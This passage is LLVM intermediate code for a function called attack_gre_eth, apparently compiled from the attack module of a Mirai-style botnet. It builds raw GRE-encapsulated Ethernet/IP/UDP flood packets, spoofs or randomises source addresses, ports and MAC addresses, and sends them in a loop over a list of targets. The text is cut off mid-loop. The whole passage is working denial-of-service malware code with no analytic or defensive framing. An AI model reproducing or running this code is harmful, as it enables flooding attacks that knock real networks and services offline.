declare i32 @htonl(i32 noundef) #3

declare i64 @sendto(i32 noundef, i8* noundef, i64 noundef, i32 noundef, %struct.sockaddr*, i32 noundef) #2

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_gre_eth(i32 noundef %0, i8 noundef zeroext %1, %struct.attack_target* noundef %2, i8 noundef zeroext %3, %struct.attack_option* noundef %4) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.ethhdr*, align 8
  %28 = alloca %struct.iphdr*, align 8
  %29 = alloca %struct.udphdr*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.grehdr*, align 8
  %36 = alloca %struct.ethhdr*, align 8
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.udphdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %44 = load i8, i8* %7, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 noundef %45, i64 noundef 8) #4
  %47 = bitcast i8* %46 to i8**
  store i8** %47, i8*** %13, align 8
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 noundef zeroext %48, %struct.attack_option* noundef %49, i8 noundef zeroext 2, i32 noundef 0)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %14, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 noundef zeroext %52, %struct.attack_option* noundef %53, i8 noundef zeroext 3, i32 noundef 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %15, align 2
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 noundef zeroext %56, %struct.attack_option* noundef %57, i8 noundef zeroext 4, i32 noundef 64)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %16, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 noundef zeroext %60, %struct.attack_option* noundef %61, i8 noundef zeroext 5, i32 noundef 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %17, align 1
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 noundef zeroext %64, %struct.attack_option* noundef %65, i8 noundef zeroext 6, i32 noundef 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %18, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 noundef zeroext %68, %struct.attack_option* noundef %69, i8 noundef zeroext 7, i32 noundef 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %19, align 2
  %72 = load i8, i8* %9, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %74 = call i32 @attack_get_opt_int(i8 noundef zeroext %72, %struct.attack_option* noundef %73, i8 noundef zeroext 0, i32 noundef 512)
  store i32 %74, i32* %20, align 4
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 noundef zeroext %75, %struct.attack_option* noundef %76, i8 noundef zeroext 1, i32 noundef 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 noundef zeroext %79, %struct.attack_option* noundef %80, i8 noundef zeroext 18, i32 noundef 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = load i32, i32* @LOCAL_ADDR, align 4
  %86 = call i32 @attack_get_opt_int(i8 noundef zeroext %83, %struct.attack_option* noundef %84, i8 noundef zeroext 19, i32 noundef %85)
  store i32 %86, i32* %23, align 4
  %87 = call i64 @time(i64* noundef null) #4
  %88 = load i32, i32* %6, align 4
  %89 = sext i32 %88 to i64
  %90 = add nsw i64 %87, %89
  %91 = trunc i64 %90 to i32
  store i32 %91, i32* %24, align 4
  %92 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #4
  store i32 %92, i32* %12, align 4
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %94, label %95

94:                                               ; preds = %5
  br label %490

95:                                               ; preds = %5
  store i32 1, i32* %11, align 4
  %96 = load i32, i32* %12, align 4
  %97 = bitcast i32* %11 to i8*
  %98 = call i32 @setsockopt(i32 noundef %96, i32 noundef 0, i32 noundef 3, i8* noundef %97, i32 noundef 4) #4
  %99 = icmp eq i32 %98, -1
  br i1 %99, label %100, label %103

100:                                              ; preds = %95
  %101 = load i32, i32* %12, align 4
  %102 = call i32 @close(i32 noundef %101)
  br label %490

103:                                              ; preds = %95
  store i32 0, i32* %11, align 4
  br label %104

104:                                              ; preds = %260, %103
  %105 = load i32, i32* %11, align 4
  %106 = load i8, i8* %7, align 1
  %107 = zext i8 %106 to i32
  %108 = icmp slt i32 %105, %107
  br i1 %108, label %109, label %263

109:                                              ; preds = %104
  %110 = call noalias i8* @calloc(i64 noundef 1510, i64 noundef 8) #4
  %111 = load i8**, i8*** %13, align 8
  %112 = load i32, i32* %11, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8*, i8** %111, i64 %113
  store i8* %110, i8** %114, align 8
  %115 = load i8**, i8*** %13, align 8
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  %119 = load i8*, i8** %118, align 8
  %120 = bitcast i8* %119 to %struct.iphdr*
  store %struct.iphdr* %120, %struct.iphdr** %25, align 8
  %121 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %122 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %121, i64 1
  %123 = bitcast %struct.iphdr* %122 to %struct.grehdr*
  store %struct.grehdr* %123, %struct.grehdr** %26, align 8
  %124 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %125 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %124, i64 1
  %126 = bitcast %struct.grehdr* %125 to %struct.ethhdr*
  store %struct.ethhdr* %126, %struct.ethhdr** %27, align 8
  %127 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %128 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %127, i64 1
  %129 = bitcast %struct.ethhdr* %128 to %struct.iphdr*
  store %struct.iphdr* %129, %struct.iphdr** %28, align 8
  %130 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %131 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %130, i64 1
  %132 = bitcast %struct.iphdr* %131 to %struct.udphdr*
  store %struct.udphdr* %132, %struct.udphdr** %29, align 8
  %133 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %134 = bitcast %struct.iphdr* %133 to i8*
  %135 = load i8, i8* %134, align 4
  %136 = and i8 %135, 15
  %137 = or i8 %136, 64
  store i8 %137, i8* %134, align 4
  %138 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %139 = bitcast %struct.iphdr* %138 to i8*
  %140 = load i8, i8* %139, align 4
  %141 = and i8 %140, -16
  %142 = or i8 %141, 5
  store i8 %142, i8* %139, align 4
  %143 = load i8, i8* %14, align 1
  %144 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 1
  store i8 %143, i8* %145, align 1
  %146 = load i32, i32* %20, align 4
  %147 = sext i32 %146 to i64
  %148 = add i64 66, %147
  %149 = trunc i64 %148 to i16
  %150 = call zeroext i16 @htons(i16 noundef zeroext %149) #5
  %151 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i32 0, i32 2
  store i16 %150, i16* %152, align 2
  %153 = load i16, i16* %15, align 2
  %154 = call zeroext i16 @htons(i16 noundef zeroext %153) #5
  %155 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 3
  store i16 %154, i16* %156, align 4
  %157 = load i8, i8* %16, align 1
  %158 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 5
  store i8 %157, i8* %159, align 4
  %160 = load i8, i8* %17, align 1
  %161 = icmp ne i8 %160, 0
  br i1 %161, label %162, label %166

162:                                              ; preds = %109
  %163 = call zeroext i16 @htons(i16 noundef zeroext 16384) #5
  %164 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 4
  store i16 %163, i16* %165, align 2
  br label %166

166:                                              ; preds = %162, %109
  %167 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 6
  store i8 47, i8* %168, align 1
  %169 = load i32, i32* %23, align 4
  %170 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 8
  store i32 %169, i32* %171, align 4
  %172 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %173 = load i32, i32* %11, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %172, i64 %174
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %175, i32 0, i32 1
  %177 = load i32, i32* %176, align 4
  %178 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 9
  store i32 %177, i32* %179, align 4
  %180 = call zeroext i16 @htons(i16 noundef zeroext 25944) #5
  %181 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %182 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %181, i32 0, i32 1
  store i16 %180, i16* %182, align 2
  %183 = call zeroext i16 @htons(i16 noundef zeroext 2048) #5
  %184 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %185 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %184, i32 0, i32 2
  store i16 %183, i16* %185, align 1
  %186 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %187 = bitcast %struct.iphdr* %186 to i8*
  %188 = load i8, i8* %187, align 4
  %189 = and i8 %188, 15
  %190 = or i8 %189, 64
  store i8 %190, i8* %187, align 4
  %191 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %192 = bitcast %struct.iphdr* %191 to i8*
  %193 = load i8, i8* %192, align 4
  %194 = and i8 %193, -16
  %195 = or i8 %194, 5
  store i8 %195, i8* %192, align 4
  %196 = load i8, i8* %14, align 1
  %197 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 1
  store i8 %196, i8* %198, align 1
  %199 = load i32, i32* %20, align 4
  %200 = sext i32 %199 to i64
  %201 = add i64 28, %200
  %202 = trunc i64 %201 to i16
  %203 = call zeroext i16 @htons(i16 noundef zeroext %202) #5
  %204 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 2
  store i16 %203, i16* %205, align 2
  %206 = load i16, i16* %15, align 2
  %207 = zext i16 %206 to i32
  %208 = xor i32 %207, -1
  %209 = trunc i32 %208 to i16
  %210 = call zeroext i16 @htons(i16 noundef zeroext %209) #5
  %211 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %211, i32 0, i32 3
  store i16 %210, i16* %212, align 4
  %213 = load i8, i8* %16, align 1
  %214 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 5
  store i8 %213, i8* %215, align 4
  %216 = load i8, i8* %17, align 1
  %217 = icmp ne i8 %216, 0
  br i1 %217, label %218, label %222

218:                                              ; preds = %166
  %219 = call zeroext i16 @htons(i16 noundef zeroext 16384) #5
  %220 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 4
  store i16 %219, i16* %221, align 2
  br label %222

222:                                              ; preds = %218, %166
  %223 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 6
  store i8 17, i8* %224, align 1
  %225 = call i32 @rand_next()
  %226 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 8
  store i32 %225, i32* %227, align 4
  %228 = load i8, i8* %22, align 1
  %229 = icmp ne i8 %228, 0
  br i1 %229, label %230, label %236

230:                                              ; preds = %222
  %231 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %232 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %231, i32 0, i32 9
  %233 = load i32, i32* %232, align 4
  %234 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 9
  store i32 %233, i32* %235, align 4
  br label %244

236:                                              ; preds = %222
  %237 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %238 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %237, i32 0, i32 8
  %239 = load i32, i32* %238, align 4
  %240 = sub i32 %239, 1024
  %241 = xor i32 %240, -1
  %242 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %243 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %242, i32 0, i32 9
  store i32 %241, i32* %243, align 4
  br label %244

244:                                              ; preds = %236, %230
  %245 = load i16, i16* %18, align 2
  %246 = call zeroext i16 @htons(i16 noundef zeroext %245) #5
  %247 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %248 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %247, i32 0, i32 0
  store i16 %246, i16* %248, align 2
  %249 = load i16, i16* %19, align 2
  %250 = call zeroext i16 @htons(i16 noundef zeroext %249) #5
  %251 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %252 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %251, i32 0, i32 1
  store i16 %250, i16* %252, align 2
  %253 = load i32, i32* %20, align 4
  %254 = sext i32 %253 to i64
  %255 = add i64 8, %254
  %256 = trunc i64 %255 to i16
  %257 = call zeroext i16 @htons(i16 noundef zeroext %256) #5
  %258 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %259 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %258, i32 0, i32 2
  store i16 %257, i16* %259, align 2
  br label %260

260:                                              ; preds = %244
  %261 = load i32, i32* %11, align 4
  %262 = add nsw i32 %261, 1
  store i32 %262, i32* %11, align 4
  br label %104, !llvm.loop !9

263:                                              ; preds = %104
  br label %264

264:                                              ; preds = %489, %263
  store i32 0, i32* %11, align 4
  br label %265

265:                                              ; preds = %480, %264
  %266 = load i32, i32* %11, align 4
  %267 = load i8, i8* %7, align 1
  %268 = zext i8 %267 to i32
  %269 = icmp slt i32 %266, %268
  br i1 %269, label %270, label %483

270:                                              ; preds = %265
  %271 = load i8**, i8*** %13, align 8
  %272 = load i32, i32* %11, align 4
  %273 = sext i32 %272 to i64
  %274 = getelementptr inbounds i8*, i8** %271, i64 %273
  %275 = load i8*, i8** %274, align 8
  store i8* %275, i8** %33, align 8
  %276 = load i8*, i8** %33, align 8
  %277 = bitcast i8* %276 to %struct.iphdr*
  store %struct.iphdr* %277, %struct.iphdr** %34, align 8
  %278 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %279 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %278, i64 1
  %280 = bitcast %struct.iphdr* %279 to %struct.grehdr*
  store %struct.grehdr* %280, %struct.grehdr** %35, align 8
  %281 = load %struct.grehdr*, %struct.grehdr** %35, align 8
  %282 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %281, i64 1
  %283 = bitcast %struct.grehdr* %282 to %struct.ethhdr*
  store %struct.ethhdr* %283, %struct.ethhdr** %36, align 8
  %284 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %285 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %284, i64 1
  %286 = bitcast %struct.ethhdr* %285 to %struct.iphdr*
  store %struct.iphdr* %286, %struct.iphdr** %37, align 8
  %287 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %288 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %287, i64 1
  %289 = bitcast %struct.iphdr* %288 to %struct.udphdr*
  store %struct.udphdr* %289, %struct.udphdr** %38, align 8
  %290 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %291 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %290, i64 1
  %292 = bitcast %struct.udphdr* %291 to i8*
  store i8* %292, i8** %39, align 8
  %293 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %294 = load i32, i32* %11, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %296, i32 0, i32 2
  %298 = load i8, i8* %297, align 4
  %299 = zext i8 %298 to i32
  %300 = icmp slt i32 %299, 32
  br i1 %300, label %301, label %322

301:                                              ; preds = %270
  %302 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %303 = load i32, i32* %11, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %302, i64 %304
  %306 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %305, i32 0, i32 1
  %307 = load i32, i32* %306, align 4
  %308 = call i32 @ntohl(i32 noundef %307) #5
  %309 = call i32 @rand_next()
  %310 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %311 = load i32, i32* %11, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %310, i64 %312
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %313, i32 0, i32 2
  %315 = load i8, i8* %314, align 4
  %316 = zext i8 %315 to i32
  %317 = lshr i32 %309, %316
  %318 = add i32 %308, %317
  %319 = call i32 @htonl(i32 noundef %318) #5
  %320 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %321 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %320, i32 0, i32 9
  store i32 %319, i32* %321, align 4
  br label %322

322:                                              ; preds = %301, %270
  %323 = load i32, i32* %23, align 4
  %324 = icmp eq i32 %323, -1
  br i1 %324, label %325, label %329

325:                                              ; preds = %322
  %326 = call i32 @rand_next()
  %327 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %328 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %327, i32 0, i32 8
  store i32 %326, i32* %328, align 4
  br label %329

329:                                              ; preds = %325, %322
  %330 = load i16, i16* %15, align 2
  %331 = zext i16 %330 to i32
  %332 = icmp eq i32 %331, 65535
  br i1 %332, label %333, label %348

333:                                              ; preds = %329
  %334 = call i32 @rand_next()
  %335 = and i32 %334, 65535
  %336 = trunc i32 %335 to i16
  %337 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %338 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %337, i32 0, i32 3
  store i16 %336, i16* %338, align 4
  %339 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 3
  %341 = load i16, i16* %340, align 4
  %342 = zext i16 %341 to i32
  %343 = sub nsw i32 %342, 1000
  %344 = xor i32 %343, -1
  %345 = trunc i32 %344 to i16
  %346 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %347 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %346, i32 0, i32 3
  store i16 %345, i16* %347, align 4
  br label %348

348:                                              ; preds = %333, %329
  %349 = load i16, i16* %18, align 2
  %350 = zext i16 %349 to i32
  %351 = icmp eq i32 %350, 65535
  br i1 %351, label %352, label %358

352:                                              ; preds = %348
  %353 = call i32 @rand_next()
  %354 = and i32 %353, 65535
  %355 = trunc i32 %354 to i16
  %356 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %357 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %356, i32 0, i32 0
  store i16 %355, i16* %357, align 2
  br label %358

358:                                              ; preds = %352, %348
  %359 = load i16, i16* %19, align 2
  %360 = zext i16 %359 to i32
  %361 = icmp eq i32 %360, 65535
  br i1 %361, label %362, label %368

362:                                              ; preds = %358
  %363 = call i32 @rand_next()
  %364 = and i32 %363, 65535
  %365 = trunc i32 %364 to i16
  %366 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %367 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %366, i32 0, i32 1
  store i16 %365, i16* %367, align 2
  br label %368

368:                                              ; preds = %362, %358
  %369 = load i8, i8* %22, align 1
  %370 = icmp ne i8 %369, 0
  br i1 %370, label %375, label %371

371:                                              ; preds = %368
  %372 = call i32 @rand_next()
  %373 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %374 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %373, i32 0, i32 9
  store i32 %372, i32* %374, align 4
  br label %381

375:                                              ; preds = %368
  %376 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %377 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %376, i32 0, i32 9
  %378 = load i32, i32* %377, align 4
  %379 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %380 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %379, i32 0, i32 9
  store i32 %378, i32* %380, align 4
  br label %381

381:                                              ; preds = %375, %371
  %382 = call i32 @rand_next()
  store i32 %382, i32* %40, align 4
  %383 = call i32 @rand_next()
  store i32 %383, i32* %41, align 4
  %384 = call i32 @rand_next()
  store i32 %384, i32* %42, align 4
  %385 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %386 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %385, i32 0, i32 0
  %387 = getelementptr inbounds [6 x i8], [6 x i8]* %386, i64 0, i64 0
  %388 = bitcast i32* %40 to i8*
  call void @util_memcpy(i8* noundef %387, i8* noundef %388, i32 noundef 4)
  %389 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %390 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %389, i32 0, i32 1
  %391 = getelementptr inbounds [6 x i8], [6 x i8]* %390, i64 0, i64 0
  %392 = bitcast i32* %41 to i8*
  call void @util_memcpy(i8* noundef %391, i8* noundef %392, i32 noundef 4)
  %393 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %394 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %393, i32 0, i32 0
  %395 = getelementptr inbounds [6 x i8], [6 x i8]* %394, i64 0, i64 0
  %396 = getelementptr inbounds i8, i8* %395, i64 4
  %397 = bitcast i32* %42 to i8*
  call void @util_memcpy(i8* noundef %396, i8* noundef %397, i32 noundef 2)
  %398 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %399 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %398, i32 0, i32 1
  %400 = getelementptr inbounds [6 x i8], [6 x i8]* %399, i64 0, i64 0
  %401 = getelementptr inbounds i8, i8* %400, i64 4
  %402 = bitcast i32* %42 to i8*
  %403 = getelementptr inbounds i8, i8* %402, i64 2
  call void @util_memcpy(i8* noundef %401, i8* noundef %403, i32 noundef 2)
  %404 = load i8, i8* %21, align 1
  %405 = icmp ne i8 %404, 0
  br i1 %405, label %406, label %413

406:                                              ; preds = %381
  %407 = load i8*, i8** %39, align 8
  %408 = load i32, i32* %20, align 4
  call void @rand_alpha_str(i8* noundef %407, i32 noundef %408)
  %409 = load i8*, i8** %39, align 8
  %410 = load i32, i32* %20, align 4
  %411 = sext i32 %410 to i64
  %412 = getelementptr inbounds i8, i8* %409, i64 %411
  store i8 0, i8* %412, align 1
  br label %413

413:                                              ; preds = %406, %381
  %414 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 7
  store i16 0, i16* %415, align 2
  %416 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %417 = bitcast %struct.iphdr* %416 to i16*
  %418 = call zeroext i16 @checksum_generic(i16* noundef %417, i32 noundef 20)
  %419 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %420 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %419, i32 0, i32 7
  store i16 %418, i16* %420, align 2
  %421 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %422 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %421, i32 0, i32 7
  store i16 0, i16* %422, align 2
  %423 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %424 = bitcast %struct.iphdr* %423 to i16*
  %425 = call zeroext i16 @checksum_generic(i16* noundef %424, i32 noundef 20)
  %426 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %427 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %426, i32 0, i32 7
  store i16 %425, i16* %427, align 2
  %428 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %429 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %428, i32 0, i32 3
  store i16 0, i16* %429, align 2
  %430 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %431 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %432 = bitcast %struct.udphdr* %431 to i8*
  %433 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %434 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %433, i32 0, i32 2
  %435 = load i16, i16* %434, align 2
  %436 = load i32, i32* %20, align 4
  %437 = sext i32 %436 to i64
  %438 = add i64 8, %437
  %439 = trunc i64 %438 to i32
  %440 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %430, i8* noundef %432, i16 noundef zeroext %435, i32 noundef %439)
  %441 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %442 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %441, i32 0, i32 3
  store i16 %440, i16* %442, align 2
  %443 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %444 = load i32, i32* %11, align 4
  %445 = sext i32 %444 to i64
  %446 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %443, i64 %445
  %447 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %446, i32 0, i32 0
  %448 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %447, i32 0, i32 0
  store i16 2, i16* %448, align 4
  %449 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %450 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %449, i32 0, i32 9
  %451 = load i32, i32* %450, align 4
  %452 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %453 = load i32, i32* %11, align 4
  %454 = sext i32 %453 to i64
  %455 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %452, i64 %454
  %456 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %455, i32 0, i32 0
  %457 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %456, i32 0, i32 2
  %458 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %457, i32 0, i32 0
  store i32 %451, i32* %458, align 4
  %459 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %460 = load i32, i32* %11, align 4
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %459, i64 %461
  %463 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %462, i32 0, i32 0
  %464 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %463, i32 0, i32 1
  store i16 0, i16* %464, align 2
  %465 = load i32, i32* %12, align 4
  %466 = load i8*, i8** %33, align 8
  %467 = load i32, i32* %20, align 4
  %468 = sext i32 %467 to i64
  %469 = add i64 66, %468
